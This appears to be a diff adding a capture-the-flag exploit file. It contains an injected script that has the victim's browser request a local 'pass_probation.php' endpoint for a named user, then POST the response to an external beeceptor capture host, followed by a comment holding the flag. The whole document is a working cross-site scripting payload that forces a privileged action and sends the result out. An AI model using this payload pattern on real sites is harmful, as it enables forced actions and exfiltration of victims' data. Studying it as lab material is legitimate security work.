@@ -1,0 +1,14 @@
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.onload = function () {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", "https://hermes.free.beeceptor.com");
+        xhr2.send(
+            "test=" + this.responseText
+        );
+    };
+    xhr.open("GET", "http://localhost/pass_probation.php?user=xiandew");
+    xhr.send();
+</script>
+
+<!-- FLAG{Probation_completed_Access_granted} -->
